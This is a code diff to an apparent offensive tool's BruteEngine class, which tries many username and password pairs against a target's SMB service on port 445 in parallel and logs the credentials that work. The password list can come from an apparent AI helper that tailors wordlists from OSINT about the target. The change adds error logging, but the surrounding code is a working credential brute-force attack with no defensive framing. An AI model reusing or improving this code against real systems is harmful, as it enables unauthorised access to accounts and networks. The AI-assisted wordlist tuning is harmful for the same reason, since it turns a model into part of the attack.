@@ -19,20 +19,24 @@ class BruteEngine:
         users = params.get("users", ["administrator", "admin"])
         passes = params.get("passes") or self.ai.tune_brute_wordlist(service, params.get("osint", ""))
         hits = []
+        errors = []
         def attempt(up):
             u, p = up
             c = None
             try:
                 c = SMBConnection(ip, ip, sess_port=445); c.login(u, p); hits.append((u, p))
-            except Exception: pass
+            except Exception as e:
+                errors.append(f"{u}: {e}")
             finally:
-                try:
-                    if c: c.close()
-                except Exception: pass
+                if c:
+                    try: c.close()
+                    except Exception as e: log(f"SMB close cleanup failed: {e}", "DBG")
         from concurrent.futures import ThreadPoolExecutor
         with ThreadPoolExecutor(max_workers=16) as ex:
             list(ex.map(attempt, [(u, p) for u in users for p in passes]))
         for u, p in hits: log(f"CREDS {ip}: {u}:{p}", "OK")
+        if not hits:
+            log(f"SMB brute vs {ip}: 0/{len(users) * len(passes)} creds hit (last error: {errors[-1] if errors else 'none reached'})", "DBG")
         return hits
 
 
